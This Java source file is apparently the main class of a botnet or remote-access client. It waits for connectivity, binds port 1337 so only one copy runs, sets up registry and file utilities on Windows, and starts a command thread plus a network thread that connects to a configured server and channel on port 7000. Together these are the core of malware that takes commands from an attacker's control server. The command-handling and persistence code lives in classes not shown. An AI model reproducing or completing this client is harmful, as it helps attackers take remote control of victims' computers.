package syn.main;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.SocketException;

import syn.threads.CmdThread;
import syn.threads.NetworkThread;
import syn.utils.FileUtils;
import syn.utils.Settings;
import syn.utils.Utilities;
import syn.utils.mutex.Mutex;
import syn.utils.reg.RegUtils;

public class Client {
	
	private static Client client;
	
	public Mutex mu;
	public RegUtils regUtils;
	public FileUtils fileUtils;
	public NetworkThread networkThread;
	public CmdThread cmdThread;
	public ServerSocket dupePrevent;
	public boolean connected = false;
	public String status;
	public Utilities uc;
	public String mutexStr;
	public String serial;
	public String os;
	
	public static void main(String[] args) {
		System.setProperty("java.net.preferIPv4Stack", "true");
		try {
			while(true) {
				if(Utilities.testURL()) {
					client = new Client();
					client.initialize();
					break;
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public static Client getInstance() {
		return client;
	}
	
	public Client() {
		checkLockSock();
	}
	
	private void initialize() {
		os = System.getProperty("os.name");
		mu = new Mutex();
		uc = new Utilities();
		if(uc.procOS(os).equals("WIN")) {
			if(!Settings.debugMode) {
				regUtils = new RegUtils();
				fileUtils = new FileUtils();
			}
		}
		//Make Command Thread
		cmdThread = new CmdThread();
		Thread cmdth = new Thread(cmdThread);
		cmdth.start();
		
		//Make Network Thread
		networkThread = new NetworkThread(Settings.server, Settings.channel, 7000);
		Thread nth = new Thread(networkThread);
		nth.start();
	}
	
	private void checkLockSock() {
		try {
			dupePrevent = new ServerSocket();
			dupePrevent.bind(new InetSocketAddress(1337));
		} catch (SocketException e) { System.exit(0); } catch (IOException e) {}
	}
}